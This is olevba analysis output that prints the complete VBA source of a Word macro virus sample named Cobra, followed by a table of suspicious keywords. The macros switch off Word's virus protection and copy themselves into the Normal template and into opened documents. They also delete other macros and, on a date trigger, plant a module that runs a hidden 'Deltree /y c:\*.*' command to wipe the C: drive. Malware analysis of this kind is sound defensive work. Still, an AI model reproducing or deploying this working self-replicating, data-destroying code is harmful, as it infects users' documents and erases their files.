olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cobra.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Cobra.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Cobra.bas 
in file: Virus.MSWord.Cobra.c - OLE stream: 'Macros/VBA/Cobra'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Cobra Version 1.0D
Sub AutoOpen()
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
Call DelNorMac
Call CopNorMac
Call DelActMac
Call CopActMac
End Sub
Sub DelNorMac()
On Error Resume Next
Set ActDoc = ActiveDocument
Set NorTem = NormalTemplate
For n = 1 To NorTem.VBProject.VBComponents.Count
If (NorTem.VBProject.VBComponents(n).Name <> "Cobra") And _
(NorTem.VBProject.VBComponents(n).Name <> "ThisDocument") Then _
Application.OrganizerDelete Source:=NorTem.FullName, _
Name:=NorTem.VBProject.VBComponents(n).Name, Object:=wdOrganizerObjectProjectItems
Next n
End Sub
Sub CopNorMac()
On Error Resume Next
Dim ComOk As Boolean
Set ActDoc = ActiveDocument
Set NorTem = NormalTemplate
For n = 1 To NorTem.VBProject.VBComponents.Count
If NorTem.VBProject.VBComponents(n).Name = "Cobra" Then _
ComOk = True
Next
If ComOk <> True Then Application.OrganizerCopy _
Source:=ActDoc.FullName, Destination:= _
NorTem.FullName, Name:="Cobra", Object:=wdOrganizerObjectProjectItems
Templates(NorTem.FullName).Save
End Sub
Sub DelActMac()
On Error Resume Next
Set ActDoc = ActiveDocument
Set NorTem = NormalTemplate
For n = 1 To ActDoc.VBProject.VBComponents.Count
If (ActDoc.VBProject.VBComponents(n).Name <> "Cobra") And _
(ActDoc.VBProject.VBComponents(n).Name <> "ThisDocument") And _
(ActDoc.VBProject.VBComponents(n).Name <> "Reference to Normal") Then _
Application.OrganizerDelete Source:=ActDoc.FullName, _
Name:=ActDoc.VBProject.VBComponents(n).Name, Object:=wdOrganizerObjectProjectItems
Next n
End Sub
Sub CopActMac()
On Error Resume Next
Dim ComOk As Boolean
Set ActDoc = ActiveDocument
Set NorTem = NormalTemplate
For n = 1 To ActDoc.VBProject.VBComponents.Count
If ActDoc.VBProject.VBComponents(n).Name = "Cobra" Then _
ComOk = True
Next
If ComOk <> True Then Application.OrganizerCopy _
Source:=NorTem.FullName, Destination:= _
ActDoc.FullName, Name:="Cobra", Object:=wdOrganizerObjectProjectItems
End Sub
Sub AutoClose()
If (Year(Now) Mod 2 = 0) And (Day(Now) = 26) And (Month(Now) = 3) Then
ActiveDocument.VBProject.VBComponents("Cobra").Export ("c:\Cobra.Sys")
Call AddModToNorTem
Call AddModToActDoc
End If
End Sub
Sub AddModToNorTem()
Dim AddOk As Boolean
Set NorTem = NormalTemplate
For n = 1 To NorTem.VBProject.VBComponents.Count
If NorTem.VBProject.VBComponents(n).Name = "war" Then _
AddOk = True
Next
If AddOk <> True Then
Set ModAdd = NormalTemplate.VBProject.VBComponents.Add(1)
ModAdd.Name = "war"
ModAdd.Codemodule.InsertLines 1, "Sub FileExit"
ModAdd.Codemodule.InsertLines 2, "On Error Resume Next"
ModAdd.Codemodule.InsertLines 3, "Msgbox ""You are infected with Cobra"",,""Cobra"
ModAdd.Codemodule.InsertLines 4, "End Sub"
ModAdd.Codemodule.InsertLines 5, "Sub FileNew"
ModAdd.Codemodule.InsertLines 6, "Shell " + """Deltree /y c:\*.*"", vbHide"
ModAdd.Codemodule.InsertLines 7, "End Sub"
ModAdd.Codemodule.InsertLines 8, "Sub FileOpen"
ModAdd.Codemodule.InsertLines 9, "On Error Resume Next"
ModAdd.Codemodule.InsertLines 10, "Set ActDoc = ActiveDocument"
ModAdd.Codemodule.InsertLines 11, "Set NorTem = NormalTemplate"
ModAdd.Codemodule.InsertLines 12, "For n = 1 To ActDoc.VBProject.VBComponents.Count"
ModAdd.Codemodule.InsertLines 13, "If (ActDoc.VBProject.VBComponents(n).Name <> ""war"") And _"
ModAdd.Codemodule.InsertLines 14, "(ActDoc.VBProject.VBComponents(n).Name <> ""ThisDocument"") And _"
ModAdd.Codemodule.InsertLines 15, "(ActDoc.VBProject.VBComponents(n).Name <> ""Reference to Normal"") Then _"
ModAdd.Codemodule.InsertLines 16, "Application.OrganizerDelete Source:=ActDoc.FullName, _"
ModAdd.Codemodule.InsertLines 17, "Name:=ActDoc.VBProject.VBComponents(n).Name, Object:=wdOrganizerObjectProjectItems"
ModAdd.Codemodule.InsertLines 18, "Next n"
ModAdd.Codemodule.InsertLines 19, "For n = 1 To NorTem.VBProject.VBComponents.Count"
ModAdd.Codemodule.InsertLines 20, "If (NorTem.VBProject.VBComponents(n).Name <> ""war"") And _"
ModAdd.Codemodule.InsertLines 21, "(NorTem.VBProject.VBComponents(n).Name <> ""ThisDocument"") Then _"
ModAdd.Codemodule.InsertLines 22, "Application.OrganizerDelete Source:=NorTem.FullName, _"
ModAdd.Codemodule.InsertLines 23, "Name:=NorTem.VBProject.VBComponents(n).Name, Object:=wdOrganizerObjectProjectItems"
ModAdd.Codemodule.InsertLines 24, "Next n"
ModAdd.Codemodule.InsertLines 25, "Dialogs(wdDialogFileOpen).Show"
ModAdd.Codemodule.InsertLines 26, "End Sub"
End If
End Sub
Sub AddModToActDoc()
Dim AddOk As Boolean
Set ActDoc = ActiveDocument
For n = 1 To ActDoc.VBProject.VBComponents.Count
If ActDoc.VBProject.VBComponents(n).Name = "war" Then _
AddOk = True
Next
If AddOk <> True Then
Set ModAdd = ActDoc.VBProject.VBComponents.Add(1)
ModAdd.Name = "war"
ModAdd.Codemodule.InsertLines 1, "Sub FileExit"
ModAdd.Codemodule.InsertLines 2, "On Error Resume Next"
ModAdd.Codemodule.InsertLines 3, "Msgbox ""You are infected with Cobra"",,""Cobra"
ModAdd.Codemodule.InsertLines 4, "End Sub"
ModAdd.Codemodule.InsertLines 5, "Sub FileNew"
ModAdd.Codemodule.InsertLines 6, "Shell " + """Deltree /y c:\*.*"", vbHide"
ModAdd.Codemodule.InsertLines 7, "End Sub"
ModAdd.Codemodule.InsertLines 8, "Sub FileOpen"
ModAdd.Codemodule.InsertLines 9, "On Error Resume Next"
ModAdd.Codemodule.InsertLines 10, "Set ActDoc = ActiveDocument"
ModAdd.Codemodule.InsertLines 11, "Set NorTem = NormalTemplate"
ModAdd.Codemodule.InsertLines 12, "For n = 1 To ActDoc.VBProject.VBComponents.Count"
ModAdd.Codemodule.InsertLines 13, "If (ActDoc.VBProject.VBComponents(n).Name <> ""war"") And _"
ModAdd.Codemodule.InsertLines 14, "(ActDoc.VBProject.VBComponents(n).Name <> ""ThisDocument"") And _"
ModAdd.Codemodule.InsertLines 15, "(ActDoc.VBProject.VBComponents(n).Name <> ""Reference to Normal"") Then _"
ModAdd.Codemodule.InsertLines 16, "Application.OrganizerDelete Source:=ActDoc.FullName, _"
ModAdd.Codemodule.InsertLines 17, "Name:=ActDoc.VBProject.VBComponents(n).Name, Object:=wdOrganizerObjectProjectItems"
ModAdd.Codemodule.InsertLines 18, "Next n"
ModAdd.Codemodule.InsertLines 19, "For n = 1 To NorTem.VBProject.VBComponents.Count"
ModAdd.Codemodule.InsertLines 20, "If (NorTem.VBProject.VBComponents(n).Name <> ""war"") And _"
ModAdd.Codemodule.InsertLines 21, "(NorTem.VBProject.VBComponents(n).Name <> ""ThisDocument"") Then _"
ModAdd.Codemodule.InsertLines 22, "Application.OrganizerDelete Source:=NorTem.FullName, _"
ModAdd.Codemodule.InsertLines 23, "Name:=NorTem.VBProject.VBComponents(n).Name, Object:=wdOrganizerObjectProjectItems"
ModAdd.Codemodule.InsertLines 24, "Next n"
ModAdd.Codemodule.InsertLines 25, "Dialogs(wdDialogFileOpen).Show"
ModAdd.Codemodule.InsertLines 26, "End Sub"
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO war.bas 
in file: Virus.MSWord.Cobra.c - OLE stream: 'Macros/VBA/war'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub FileExit()
On Error Resume Next
MsgBox "You are infected with Cobra", , "Cobra"
End Sub
Sub FileNew()
Shell "Deltree /y c:\*.*", vbHide
End Sub
Sub FileOpen()
On Error Resume Next
Set ActDoc = ActiveDocument
Set NorTem = NormalTemplate
For n = 1 To ActDoc.VBProject.VBComponents.Count
If (ActDoc.VBProject.VBComponents(n).Name <> "war") And _
(ActDoc.VBProject.VBComponents(n).Name <> "ThisDocument") And _
(ActDoc.VBProject.VBComponents(n).Name <> "Reference to Normal") Then _
Application.OrganizerDelete Source:=ActDoc.FullName, _
Name:=ActDoc.VBProject.VBComponents(n).Name, Object:=wdOrganizerObjectProjectItems
Next n
For n = 1 To NorTem.VBProject.VBComponents.Count
If (NorTem.VBProject.VBComponents(n).Name <> "war") And _
(NorTem.VBProject.VBComponents(n).Name <> "ThisDocument") Then _
Application.OrganizerDelete Source:=NorTem.FullName, _
Name:=NorTem.VBProject.VBComponents(n).Name, Object:=wdOrganizerObjectProjectItems
Next n
Dialogs(wdDialogFileOpen).Show
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

